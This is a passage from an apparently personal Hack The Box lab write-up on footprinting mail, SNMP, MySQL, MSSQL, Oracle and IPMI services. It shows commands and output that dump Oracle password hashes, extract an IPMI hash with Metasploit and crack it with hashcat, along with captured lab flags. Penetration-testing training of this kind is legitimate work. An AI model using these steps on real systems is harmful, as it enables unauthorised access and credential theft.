    0010 - 02 1a 51 c4 6d 63 66 9a-53 42 6c d6 d9 23 f9 11   ..Q.mcf.SBl..#..
    0020 - 9a f3 42 0d 64 b1 75 2e-9b 0a aa 10 c6 4b 5d 85   ..B.d.u......K].
    0030 - 9e ef f0 f7 1a 11 ed 5f-80 2c be 0c 1d 6e 69 da   ......._.,...ni.
    0040 - 9d b2 18 33 d2 c2 4c 92-11 f5 ee 4e 92 de ed 23   ...3..L....N...#
    0050 - b4 94 21 12 0e df e5 2e-9a 1f e5 a0 ad ce ea 5c   ..!............\
    0060 - 70 ae 07 80 49 d9 26 a9-24 5b dc d5 0d a8 e7 87   p...I.&.$[......
    0070 - 9a 11 a9 43 de 36 a3 ed-3a ba f2 b6 e5 90 4f 36   ...C.6..:.....O6
    0080 - ba 99 7d ac 59 cc 21 80-90 dd cb da ec 34 6b d5   ..}.Y.!......4k.
    0090 - fd 24 af 88 48 28 3e c8-83 5a 5d f5 ff 97 b4 ec   .$..H(>..Z].....
    00a0 - 9c f1 71 8c 4b 71 32 b2-f4 fd fb 40 ce 06 46 18   ..q.Kq2....@..F.
    00b0 - bc a4 f7 1d d3 1e 67 6d-86 fd 45 90 3f 4b 5a 06   ......gm..E.?KZ.

    Start Time: 1787822423
    Timeout   : 7200 (sec)
    Verify return code: 18 (self-signed certificate)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] HTB{roncfbw7iszerd7shni7jr2343zhrj}
A1 LOGIN robin robin
A1 OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE] Logged in
A2 SELECT DEV.DEPARTMENT.INT
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
* 1 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1636414279] UIDs valid
* OK [UIDNEXT 2] Predicted next UID
A2 OK [READ-WRITE] Select completed (0.016 + 0.000 + 0.015 secs).
A3 FETCH 1:* ALL    
* 1 FETCH (FLAGS (\Seen) INTERNALDATE "08-Nov-2021 23:51:24 +0000" RFC822.SIZE 167 ENVELOPE ("Wed, 03 Nov 2021 16:13:27 +0200" "Flag" (("CTO" NIL "devadmin" "inlanefreight.htb")) (("CTO" NIL "devadmin" "inlanefreight.htb")) (("CTO" NIL "devadmin" "inlanefreight.htb")) (("Robin" NIL "robin" "inlanefreight.htb")) NIL NIL NIL NIL))
A3 OK Fetch completed (0.013 + 0.000 + 0.012 secs).
A4 FETCH 1 BODY[]
* 1 FETCH (BODY[] {167}
Subject: Flag
To: Robin <robin@inlanefreight.htb>
From: CTO <devadmin@inlanefreight.htb>
Date: Wed, 03 Nov 2021 16:13:27 +0200

HTB{983uzn8jmfgpd8jmof8c34n7zio}
)
A4 OK Fetch completed (0.002 + 0.000 + 0.001 secs).


```

Q4. What is the customized version of the POP3 server?

```
 nc -nv 10.129.133.198 110
(UNKNOWN) [10.129.133.198] 110 (pop3) open
+OK InFreight POP3 v9.188


```

Q5. What is the admin email address?

```
A3 FETCH 1:* ALL
* 1 FETCH (FLAGS (\Seen) INTERNALDATE "08-Nov-2021 23:51:24 +0000" RFC822.SIZE 167 ENVELOPE ("Wed, 03 Nov 2021 16:13:27 +0200" "Flag" (("CTO" NIL "devadmin" "inlanefreight.htb")) (("CTO" NIL "devadmin" "inlanefreight.htb")) (("CTO" NIL "devadmin" "inlanefreight.htb")) (("Robin" NIL "robin" "inlanefreight.htb")) NIL NIL NIL NIL))
A3 OK Fetch completed (0.002 + 0.000 + 0.001 secs).
A4 FETCH 1 BODY[]
* 1 FETCH (BODY[] {167}
Subject: Flag
To: Robin <robin@inlanefreight.htb>
From: CTO <devadmin@inlanefreight.htb>
Date: Wed, 03 Nov 2021 16:13:27 +0200

HTB{983uzn8jmfgpd8jmof8c34n7zio}
)
A4 OK Fetch completed (0.001 + 0.000 secs).


```

Q6. Try to access the emails on the IMAP server and submit the flag as the answer. (Format: HTB{...})

```
A2 SELECT DEV.DEPARTMENT.INT
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
* 1 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1636414279] UIDs valid
* OK [UIDNEXT 2] Predicted next UID
A2 OK [READ-WRITE] Select completed (0.001 + 0.000 secs).
A3 FETCH 1:* ALL
* 1 FETCH (FLAGS (\Seen) INTERNALDATE "08-Nov-2021 23:51:24 +0000" RFC822.SIZE 167 ENVELOPE ("Wed, 03 Nov 2021 16:13:27 +0200" "Flag" (("CTO" NIL "devadmin" "inlanefreight.htb")) (("CTO" NIL "devadmin" "inlanefreight.htb")) (("CTO" NIL "devadmin" "inlanefreight.htb")) (("Robin" NIL "robin" "inlanefreight.htb")) NIL NIL NIL NIL))
A3 OK Fetch completed (0.002 + 0.000 + 0.001 secs).
A4 FETCH 1 BODY[]
* 1 FETCH (BODY[] {167}
Subject: Flag
To: Robin <robin@inlanefreight.htb>
From: CTO <devadmin@inlanefreight.htb>
Date: Wed, 03 Nov 2021 16:13:27 +0200

HTB{983uzn8jmfgpd8jmof8c34n7zio}
)
A4 OK Fetch completed (0.001 + 0.000 secs).


```

# SNMP

Q1. Enumerate the SNMP service and obtain the email address of the admin. Submit it as the answer.

```
snmpwalk -v2c -c public 10.129.135.103 .1.3.6.1.2.1.1.4.0
iso.3.6.1.2.1.1.4.0 = STRING: "devadmin <devadmin@inlanefreight.htb>"
                                                                                                
```

Q2. What is the customized version of the SNMP server?

```
                      
┌──(satoru㉿satoru)-[~/Desktop/HTB/CPTS/skills]
└─$ snmpwalk -v2c -c public 10.129.135.103                   
iso.3.6.1.2.1.1.1.0 = STRING: "Linux NIX02 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (372549) 1:02:05.49
iso.3.6.1.2.1.1.4.0 = STRING: "devadmin <devadmin@inlanefreight.htb>"
iso.3.6.1.2.1.1.5.0 = STRING: "NIX02"
iso.3.6.1.2.1.1.6.0 = STRING: "InFreight SNMP v0.91"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (45) 0:00:00.45
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (43) 0:00:00.43
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (43) 0:00:00.43
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (43) 0:00:00.43
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (43) 0:00:00.43
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (43) 0:00:00.43
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (43) 0:00:00.43
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (43) 0:00:00.43
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (43) 0:00:00.43
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (45) 0:00:00.45
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (45) 0:00:00.45
iso.3.6.1.2.1.2.1.0 = INTEGER: 2
iso.3.6.1.2.1.2.2.1.1.1 = INTEGER: 1
iso.3.6.1.2.1.2.2.1.1.2 = INTEGER: 2
iso.3.6.1.2.1.2.2.1.2.1 = STRING: "lo"
iso.3.6.1.2.1.2.2.1.2.2 = STRING: "VMware VMXNET3 Ethernet Controller"
iso.3.6.1.2.1.2.2.1.3.1 = INTEGER: 24
iso.3.6.1.2.1.2.2.1.3.2 = INTEGER: 6
iso.3.6.1.2.1.2.2.1.4.1 = INTEGER: 65536
iso.3.6.1.2.1.2.2.1.4.2 = INTEGER: 1500
iso.3.6.1.2.1.2.2.1.5.1 = Gauge32: 10000000
iso.3.6.1.2.1.2.2.1.5.2 = Gauge32: 4294967295
iso.3.6.1.2.1.2.2.1.6.1 = ""
iso.3.6.1.2.1.2.2.1.6.2 = Hex-STRING: A2 DE AD FF DB AE 
iso.3.6.1.2.1.2.2.1.7.1 = INTEGER: 1
iso.3.6.1.2.1.2.2.1.7.2 = INTEGER: 1
iso.3.6.1.2.1.2.2.1.8.1 = INTEGER: 1
iso.3.6.1.2.1.2.2.1.8.2 = INTEGER: 1
iso.3.6.1.2.1.2.2.1.9.1 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.2.2.1.9.2 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.2.2.1.10.1 = Counter32: 344366
iso.3.6.1.2.1.2.2.1.10.2 = Counter32: 2111733
iso.3.6.1.2.1.2.2.1.11.1 = Counter32: 4377
iso.3.6.1.2.1.2.2.1.11.2 = Counter32: 30922
iso.3.6.1.2.1.2.2.1.12.1 = Counter32: 0
iso.3.6.1.2.1.2.2.1.12.2 = Counter32: 42
iso.3.6.1.2.1.2.2.1.13.1 = Counter32: 0
iso.3.6.1.2.1.2.2.1.13.2 = Counter32: 0
iso.3.6.1.2.1.2.2.1.14.1 = Counter32: 0
iso.3.6.1.2.1.2.2.1.14.2 = Counter32: 0
iso.3.6.1.2.1.2.2.1.15.1 = Counter32: 0
iso.3.6.1.2.1.2.2.1.15.2 = Counter32: 0
iso.3.6.1.2.1.2.2.1.16.1 = Counter32: 345188
iso.3.6.1.2.1.2.2.1.16.2 = Counter32: 472538
iso.3.6.1.2.1.2.2.1.17.1 = Counter32: 4387
iso.3.6.1.2.1.2.2.1.17.2 = Counter32: 4575
iso.3.6.1.2.1.2.2.1.18.1 = Counter32: 0
iso.3.6.1.2.1.2.2.1.18.2 = Counter32: 0
iso.3.6.1.2.1.2.2.1.19.1 = Counter32: 0
iso.3.6.1.2.1.2.2.1.19.2 = Counter32: 0
iso.3.6.1.2.1.2.2.1.20.1 = Counter32: 0
iso.3.6.1.2.1.2.2.1.20.2 = Counter32: 0
iso.3.6.1.2.1.2.2.1.21.1 = Gauge32: 0
iso.3.6.1.2.1.2.2.1.21.2 = Gauge32: 0
iso.3.6.1.2.1.2.2.1.22.1 = OID: ccitt.0
iso.3.6.1.2.1.2.2.1.22.2 = OID: ccitt.0
iso.3.6.1.2.1.3.1.1.1.2.1.10.129.0.1 = INTEGER: 2
iso.3.6.1.2.1.3.1.1.2.2.1.10.129.0.1 = Hex-STRING: 00 50 56 B0 D2 FC 
iso.3.6.1.2.1.3.1.1.3.2.1.10.129.0.1 = IpAddress: 10.129.0.1

```

Q3.  Enumerate the custom script that is running on the system and submit its output as the answer.

```
iso.3.6.1.2.1.25.1.7.1.2.1.2.4.70.76.65.71 = STRING: "/usr/share/flag.sh"
iso.3.6.1.2.1.25.1.7.1.2.1.3.4.70.76.65.71 = ""
iso.3.6.1.2.1.25.1.7.1.2.1.4.4.70.76.65.71 = ""
iso.3.6.1.2.1.25.1.7.1.2.1.5.4.70.76.65.71 = INTEGER: 5
iso.3.6.1.2.1.25.1.7.1.2.1.6.4.70.76.65.71 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.7.4.70.76.65.71 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.20.4.70.76.65.71 = INTEGER: 4
iso.3.6.1.2.1.25.1.7.1.2.1.21.4.70.76.65.71 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.3.1.1.4.70.76.65.71 = STRING: "HTB{5nMp_fl4g_uidhfljnsldiuhbfsdij44738b2u763g}"
iso.3.6.1.2.1.25.1.7.1.3.1.2.4.70.76.65.71 = STRING: "HTB{5nMp_fl4g_uidhfljnsldiuhbfsdij44738b2u763g}"
iso.3.6.1.2.1.25.1.7.1.3.1.3.4.70.76.65.71 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.3.1.4.4.70.76.65.71 = INTEGER: 0
iso.3.6.1.2.1.25.1.7.1.4.1.2.4.70.76.65.71.1 = STRING: "HTB{5nMp_fl4g_uidhfljnsldiuhbfsdij44738b2u763g}"
iso.3.6.1.2.1.25.2.2.0 = INTEGER: 2035168
iso.3.6.1.2.1.25.2.3.1.1.1 = INTEGER: 1
iso.3.6.1.2.1.25.2.3.1.1.3 = INTEGER: 3
^C

```

# MySQL

Q1. Enumerate the MySQL server and determine the version in use. (Format: MySQL X.X.XX)

```
satoru㉿satoru)-[~/Desktop/HTB/CPTS/skills]
└─$ sudo nmap -sCV 10.129.135.155         
[sudo] password for satoru: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-28 12:49 +0530
Stats: 0:00:37 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 100.00% done; ETC: 12:50 (0:00:00 remaining)
Stats: 0:01:32 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 82.81% done; ETC: 12:51 (0:00:08 remaining)
Stats: 0:01:32 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 82.81% done; ETC: 12:51 (0:00:08 remaining)
Nmap scan report for 10.129.135.155
Host is up (0.29s latency).
Not shown: 992 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
25/tcp   open  smtp
|_smtp-commands: mail1, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
| fingerprint-strings: 
|   Hello: 
|     220 InFreight ESMTP v2.11
|_    Syntax: EHLO hostname
53/tcp   open  domain   ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
110/tcp  open  pop3     Dovecot pop3d
| ssl-cert: Subject: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-11-08T23:10:05
|_Not valid after:  2295-08-23T23:10:05
|_pop3-capabilities: SASL CAPA AUTH-RESP-CODE RESP-CODES STLS UIDL TOP PIPELINING
|_ssl-date: TLS randomness does not represent time
143/tcp  open  imap     Dovecot imapd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-11-08T23:10:05
|_Not valid after:  2295-08-23T23:10:05
|_imap-capabilities: LOGINDISABLEDA0001 more IMAP4rev1 post-login LITERAL+ IDLE ENABLE LOGIN-REFERRALS have Pre-login listed ID OK capabilities SASL-IR STARTTLS
993/tcp  open  ssl/imap Dovecot imapd
| ssl-cert: Subject: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-11-08T23:10:05
|_Not valid after:  2295-08-23T23:10:05
|_imap-capabilities: OK IMAP4rev1 post-login LITERAL+ IDLE ENABLE LOGIN-REFERRALS more Pre-login listed have AUTH=PLAINA0001 capabilities SASL-IR ID
|_ssl-date: TLS randomness does not represent time
995/tcp  open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) CAPA AUTH-RESP-CODE RESP-CODES USER UIDL TOP PIPELINING
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-11-08T23:10:05
|_Not valid after:  2295-08-23T23:10:05
3306/tcp open  mysql    MySQL 8.0.27-0ubuntu0.20.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.27-0ubuntu0.20.04.1
|   Thread ID: 9
|   Capabilities flags: 65535
|   Some Capabilities: Speaks41ProtocolNew, Support41Auth, ConnectWithDatabase, SupportsTransactions, LongColumnFlag, FoundRows, SupportsLoadDataLocal, SupportsCompression, Speaks41ProtocolOld, IgnoreSigpipes, SwitchToSSLAfterHandshake, DontAllowDatabaseTableColumn, InteractiveClient, IgnoreSpaceBeforeParenthesis, ODBCClient, LongPassword, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: zQg4\x12\x18Vf?(@t9\x1F=kEOW2
|_  Auth Plugin Name: caching_sha2_password
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port25-TCP:V=7.99%I=7%D=8/28%Time=6A9136B2%P=x86_64-pc-linux-gnu%r(Hell
SF:o,36,"220\x20InFreight\x20ESMTP\x20v2\.11\r\n501\x20Syntax:\x20EHLO\x20
SF:hostname\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 106.66 seconds
                                                                                              
```

Q2. During our penetration test, we found weak credentials "robin:robin". We should try these against the MySQL server. What is the email address of the customer "Otto Lang"?

```
our MySQL server version for the right syntax to use near 'myTable' at line 1
MySQL [customers]> SELECT email FROM myTable WHERE name = 'Otto Lang';
+---------------------+
| email               |
+---------------------+
| ultrices@google.htb |
+---------------------+
1 row in set (0.330 sec)


```

# MSSQL

Q1. Enumerate the target using the concepts taught in this section. List the hostname of MSSQL server.

```
udo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.137.43
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-29 09:36 +0530
Nmap scan report for 10.129.137.43
Host is up (0.30s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.137.43\MSSQLSERVER: 
|     Target_Name: ILF-SQL-01
|     NetBIOS_Domain_Name: ILF-SQL-01
|     NetBIOS_Computer_Name: ILF-SQL-01
|     DNS_Domain_Name: ILF-SQL-01
|     DNS_Computer_Name: ILF-SQL-01
|_    Product_Version: 10.0.17763
| ms-sql-config: 
|   10.129.137.43\MSSQLSERVER: 
|_  ERROR: Bad username or password
| ms-sql-tables: 
|   10.129.137.43\MSSQLSERVER: 
|_[10.129.137.43\MSSQLSERVER]
| ms-sql-empty-password: 
|_  10.129.137.43\MSSQLSERVER: 
| ms-sql-xp-cmdshell: 
|_  (Use --script-args=ms-sql-xp-cmdshell.cmd='<CMD>' to change command.)
| ms-sql-dac: 
|   10.129.137.43\MSSQLSERVER: 
|     port: 1434
|     state: closed
|_    error: ERROR
| ms-sql-info: 
|   10.129.137.43\MSSQLSERVER: 
|     Instance name: MSSQLSERVER
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 1433
|     Named pipe: \\10.129.137.43\pipe\sql\query
|_    Clustered: false
| ms-sql-dump-hashes: 
|_  10.129.137.43\MSSQLSERVER: ERROR: Bad username or password

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.55 seconds
                                                                                            
```

Q2.  Connect to the MSSQL instance running on the target using the account (backdoor:Password1), then list the non-default database present on the server.

```
mssqlclient.py backdoor:Password1@10.129.137.47
```

this should work but dont know what happened maybe target issue.

# Oracle TNS

Q1.  Enumerate the target Oracle database and submit the password hash of the user DBSNMP as the answer.


```
SQL> select name, password from sys.user$;

NAME                           PASSWORD
------------------------------ ------------------------------
SYS                            FBA343E7D6C8BC9D
PUBLIC
CONNECT
RESOURCE
DBA
SYSTEM                         B5073FE1DE351687
SELECT_CATALOG_ROLE
EXECUTE_CATALOG_ROLE
DELETE_CATALOG_ROLE
OUTLN                          4A3BA55E08595C81
EXP_FULL_DATABASE

NAME                           PASSWORD
------------------------------ ------------------------------
IMP_FULL_DATABASE
LOGSTDBY_ADMINISTRATOR
DBFS_ROLE
DIP                            CE4A36B8E06CA59C
AQ_ADMINISTRATOR_ROLE
AQ_USER_ROLE
DATAPUMP_EXP_FULL_DATABASE
DATAPUMP_IMP_FULL_DATABASE
ADM_PARALLEL_EXECUTE_TASK
GATHER_SYSTEM_STATISTICS
XDB_WEBSERVICES_OVER_HTTP

NAME                           PASSWORD
------------------------------ ------------------------------
ORACLE_OCM                     5A2E026A9157958C
RECOVERY_CATALOG_OWNER
SCHEDULER_ADMIN
HS_ADMIN_SELECT_ROLE
HS_ADMIN_EXECUTE_ROLE
HS_ADMIN_ROLE
OEM_ADVISOR
OEM_MONITOR
DBSNMP                         E066D214D5421CCC
APPQOSSYS                      519D632B7EE7F63A
PLUSTRACE

NAME                           PASSWORD
------------------------------ ------------------------------
CTXSYS                         D1D21CA56994CAB6
CTXAPP
XDB                            E76A6BD999EF9FF1
ANONYMOUS                      anonymous
XDBADMIN
XDB_SET_INVOKER
AUTHENTICATEDUSER
XDB_WEBSERVICES
XDB_WEBSERVICES_WITH_PUBLIC
XS$NULL                        DC4FCC8CB69A6733
_NEXT_USER

NAME                           PASSWORD
------------------------------ ------------------------------
MDSYS                          72979A94BAD2AF80
HR                             4C6D73C3E8B0F0DA
FLOWS_FILES                    30128982EA6D4A3D
APEX_PUBLIC_USER               4432BA224E12410A
APEX_ADMINISTRATOR_ROLE
APEX_040000                    E7CE9863D7EEB0A4
SCOTT                          F894844C34402B67

51 rows selected.


```
# IPMI

Q1. What username is configured for accessing the host via IPMI?

```
msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS 10.129.137.55; run; exit"
RHOSTS => 10.129.137.55
/opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/ipmi/ipmi_dumphashes.rb:350: warning: Socket#sendto is deprecated; use send(mesg, flags, host, port) instead
/opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/ipmi/ipmi_dumphashes.rb:350: warning: Socket#sendto is deprecated; use send(mesg, flags, host, port) instead
/opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/ipmi/ipmi_dumphashes.rb:350: warning: Socket#sendto is deprecated; use send(mesg, flags, host, port) instead
/opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/ipmi/ipmi_dumphashes.rb:350: warning: Socket#sendto is deprecated; use send(mesg, flags, host, port) instead
[+] 10.129.137.55:623 - IPMI - Hash found: admin:19d9024682000000b5237679c88bdc61777314f8fa9fece701105ad20aa441901aff88eac2e785f5a123456789abcdefa123456789abcdef140561646d696e:e262eabd084becb293e0c405617c846f99987809
/opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/ipmi/ipmi_dumphashes.rb:350: warning: Socket#sendto is deprecated; use send(mesg, flags, host, port) instead
/opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/ipmi/ipmi_dumphashes.rb:350: warning: Socket#sendto is deprecated; use send(mesg, flags, host, port) instead
/opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/ipmi/ipmi_dumphashes.rb:350: warning: Socket#sendto is deprecated; use send(mesg, flags, host, port) instead
/opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/ipmi/ipmi_dumphashes.rb:350: warning: Socket#sendto is deprecated; use send(mesg, flags, host, port) instead
/opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/ipmi/ipmi_dumphashes.rb:350: warning: Socket#sendto is deprecated; use send(mesg, flags, host, port) instead
/opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/ipmi/ipmi_dumphashes.rb:350: warning: Socket#sendto is deprecated; use send(mesg, flags, host, port) instead
/opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/ipmi/ipmi_dumphashes.rb:350: warning: Socket#sendto is deprecated; use send(mesg, flags, host, port) instead
/opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/ipmi/ipmi_dumphashes.rb:350: warning: Socket#sendto is deprecated; use send(mesg, flags, host, port) instead
/opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/ipmi/ipmi_dumphashes.rb:350: warning: Socket#sendto is deprecated; use send(mesg, flags, host, port) instead
/opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/ipmi/ipmi_dumphashes.rb:350: warning: Socket#sendto is deprecated; use send(mesg, flags, host, port) instead
/opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/ipmi/ipmi_dumphashes.rb:350: warning: Socket#sendto is deprecated; use send(mesg, flags, host, port) instead
/opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/ipmi/ipmi_dumphashes.rb:350: warning: Socket#sendto is deprecated; use send(mesg, flags, host, port) instead
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```


Q2. What is the account's cleartext password?

```
hashcat -m 7300 -a 0 ipmi.hash /home/satoru/Desktop/HACKVISER/CAPT/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 7.1+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 21.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Ryzen 7 4800H with Radeon Graphics, 2204/4409 MB (2204 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (2334 MB free)


Dictionary cache hit:
* Filename..: /home/satoru/Desktop/HACKVISER/CAPT/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

19d9024682000000b5237679c88bdc61777314f8fa9fece701105ad20aa441901aff88eac2e785f5a123456789abcdefa123456789abcdef140561646d696e:e262eabd084becb293e0c405617c846f99987809:trinity
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 7300 (IPMI2 RAKP HMAC-SHA1)
Hash.Target......: 19d9024682000000b5237679c88bdc61777314f8fa9fece7011...987809
Time.Started.....: Sat Aug 29 10:35:12 2026 (0 secs)
Time.Estimated...: Sat Aug 29 10:35:12 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/home/satoru/Desktop/HACKVISER/CAPT/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
